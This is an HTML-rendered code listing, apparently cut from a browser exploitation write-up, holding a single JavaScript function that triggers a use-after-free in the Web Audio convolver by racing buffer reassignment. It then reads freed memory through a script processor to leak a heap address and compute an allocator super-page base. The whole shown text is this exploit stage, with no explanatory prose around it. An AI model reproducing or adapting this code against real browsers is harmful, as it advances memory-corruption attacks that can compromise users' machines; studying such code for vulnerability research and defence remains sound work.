					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-676241da675d4616661972-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-2">2</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-4">4</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-6">6</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-8">8</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-10">10</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-12">12</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-14">14</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-16">16</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-18">18</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-20">20</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-22">22</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-24">24</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-26">26</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-28">28</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-30">30</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-32">32</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-34">34</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-36">36</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-38">38</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-40">40</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-42">42</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-44">44</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-46">46</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-48">48</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-50">50</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-52">52</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-54">54</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-56">56</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-58">58</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-60">60</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-62">62</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-64">64</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-66">66</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-68">68</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-70">70</div><div class="crayon-num" data-line="crayon-676241da675d4616661972-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-676241da675d4616661972-72">72</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-676241da675d4616661972-1"><span class="crayon-e">async </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">triggerUaF</span><span class="crayon-sy">(</span><span class="crayon-i">doneCb</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-2"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">audioCtx</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">OfflineAudioContext</span><span class="crayon-sy">(</span><span class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x400000</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">48000</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-3"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">bufferSource</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">audioCtx</span><span class="crayon-sy">.</span><span class="crayon-e">createBufferSource</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-4"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">convolver</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">audioCtx</span><span class="crayon-sy">.</span><span class="crayon-e">createConvolver</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-5"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">scriptNode</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">audioCtx</span><span class="crayon-sy">.</span><span class="crayon-e">createScriptProcessor</span><span class="crayon-sy">(</span><span class="crayon-cn">0x4000</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-6"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">channelBuffer</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">audioCtx</span><span class="crayon-sy">.</span><span class="crayon-e">createBuffer</span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">48000</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-7"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-8"><span class="crayon-h">	</span><span class="crayon-i">convolver</span><span class="crayon-sy">.</span><span class="crayon-i">buffer</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">channelBuffer</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-9"><span class="crayon-h">	</span><span class="crayon-i">bufferSource</span><span class="crayon-sy">.</span><span class="crayon-i">buffer</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">channelBuffer</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-10"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d4616661972-11"><span class="crayon-h">	</span><span class="crayon-i">bufferSource</span><span class="crayon-sy">.</span><span class="crayon-i">loop</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-12"><span class="crayon-h">	</span><span class="crayon-i">bufferSource</span><span class="crayon-sy">.</span><span class="crayon-i">loopStart</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-13"><span class="crayon-h">	</span><span class="crayon-i">bufferSource</span><span class="crayon-sy">.</span><span class="crayon-i">loopEnd</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-14"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d4616661972-15"><span class="crayon-h">	</span><span class="crayon-i">channelBuffer</span><span class="crayon-sy">.</span><span class="crayon-e">getChannelData</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">fill</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-16"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d4616661972-17"><span class="crayon-h">	</span><span class="crayon-i">bufferSource</span><span class="crayon-sy">.</span><span class="crayon-e">connect</span><span class="crayon-sy">(</span><span class="crayon-i">convolver</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-18"><span class="crayon-h">	</span><span class="crayon-i">convolver</span><span class="crayon-sy">.</span><span class="crayon-e">connect</span><span class="crayon-sy">(</span><span class="crayon-i">scriptNode</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-19"><span class="crayon-h">	</span><span class="crayon-i">scriptNode</span><span class="crayon-sy">.</span><span class="crayon-e">connect</span><span class="crayon-sy">(</span><span class="crayon-i">audioCtx</span><span class="crayon-sy">.</span><span class="crayon-i">destination</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-20"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d4616661972-21"><span class="crayon-h">	</span><span class="crayon-i">bufferSource</span><span class="crayon-sy">.</span><span class="crayon-e">start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-22"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d4616661972-23"><span class="crayon-h">	</span><span class="crayon-e">let </span><span class="crayon-i">finished</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-24"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d4616661972-25"><span class="crayon-h">	</span><span class="crayon-i">scriptNode</span><span class="crayon-sy">.</span><span class="crayon-i">onaudioprocess</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">function</span><span class="crayon-sy">(</span><span class="crayon-i">evt</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-e">let </span><span class="crayon-i">channelDataArray</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">Uint32Array</span><span class="crayon-sy">(</span><span class="crayon-i">evt</span><span class="crayon-sy">.</span><span class="crayon-i">inputBuffer</span><span class="crayon-sy">.</span><span class="crayon-e">getChannelData</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-i">buffer</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-27"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">let</span><span class="crayon-h"> </span><span class="crayon-i">j</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">j</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-i">channelDataArray</span><span class="crayon-sy">.</span><span class="crayon-i">length</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">j</span>++<span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">j</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-h"> </span><span class="crayon-i">channelDataArray</span><span class="crayon-sy">.</span><span class="crayon-i">length</span><span class="crayon-h"> </span><span class="crayon-sy">&amp;&amp; channelDataArray[j] != 0 &amp;&amp; channelDataArray[j + 1] != 0) {</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-30"><span class="crayon-sy">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			let u64Array = new BigUint64Array(1);</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-e">let </span><span class="crayon-i">u32Array</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">Uint32Array</span><span class="crayon-sy">(</span><span class="crayon-i">u64Array</span><span class="crayon-sy">.</span><span class="crayon-i">buffer</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-i">u32Array</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">channelDataArray</span><span class="crayon-sy">[</span><span class="crayon-i">j</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-i">u32Array</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">channelDataArray</span><span class="crayon-sy">[</span><span class="crayon-i">j</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-34"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d4616661972-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-e">let </span><span class="crayon-i">leakedAddr</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">byteSwapBigInt</span><span class="crayon-sy">(</span><span class="crayon-i">u64Array</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">leakedAddr</span><span class="crayon-h"> </span><span class="crayon-h">&gt;</span><span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">32</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0x8000</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-i">leakedAddr</span><span class="crayon-h"> </span>-=<span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0x800000000000</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 			</span><span class="crayon-e">let </span><span class="crayon-i">superPageBase</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">getSuperPageBase</span><span class="crayon-sy">(</span><span class="crayon-i">leakedAddr</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-39"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-40"><span class="crayon-h">	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 		</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">superPageBase</span><span class="crayon-h"> </span><span class="crayon-h">&gt;</span><span class="crayon-h"> </span><span class="crayon-e">BigInt</span><span class="crayon-sy">(</span><span class="crayon-cn">0xFFFFFFFF</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">&amp;&amp; superPageBase &lt; BigInt(0xFFFFFFFFFFFF)) {</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-41"><span class="crayon-sy">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			finished = true;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-i">evt</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-43"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-i">bufferSource</span><span class="crayon-sy">.</span><span class="crayon-e">disconnect</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-i">scriptNode</span><span class="crayon-sy">.</span><span class="crayon-e">disconnect</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-i">convolver</span><span class="crayon-sy">.</span><span class="crayon-e">disconnect</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-47"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-48"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-e">setTimeout</span><span class="crayon-sy">(</span><span class="crayon-t">function</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 			</span><span class="crayon-e">doneCb</span><span class="crayon-sy">(</span><span class="crayon-i">leakedAddr</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-50"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-51"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-52"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-st">return</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-53"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;			</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-54"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-55"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-56"><span class="crayon-h">	</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-57"><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-58"><span class="crayon-h">	</span><span class="crayon-i">audioCtx</span><span class="crayon-sy">.</span><span class="crayon-e">startRendering</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-st">then</span><span class="crayon-sy">(</span><span class="crayon-t">function</span><span class="crayon-sy">(</span><span class="crayon-i">buffer</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-59"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">buffer</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-60"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d4616661972-61"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">!</span><span class="crayon-i">finished</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-62"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	 	</span><span class="crayon-i">finished</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-63"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 	&nbsp;&nbsp;	</span><span class="crayon-e">triggerUaF</span><span class="crayon-sy">(</span><span class="crayon-i">doneCb</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-64"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-65"><span class="crayon-h">	</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-66"><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-676241da675d4616661972-67"><span class="crayon-h">	</span><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">!</span><span class="crayon-i">finished</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-68"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">convolver</span><span class="crayon-sy">.</span><span class="crayon-i">buffer</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-69"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-i">convolver</span><span class="crayon-sy">.</span><span class="crayon-i">buffer</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">channelBuffer</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-70"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;		</span><span class="crayon-e">await </span><span class="crayon-e">later</span><span class="crayon-sy">(</span><span class="crayon-cn">100</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// wait 100 millseconds</span></div><div class="crayon-line" id="crayon-676241da675d4616661972-71"><span class="crayon-h">	</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-676241da675d4616661972-72"><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
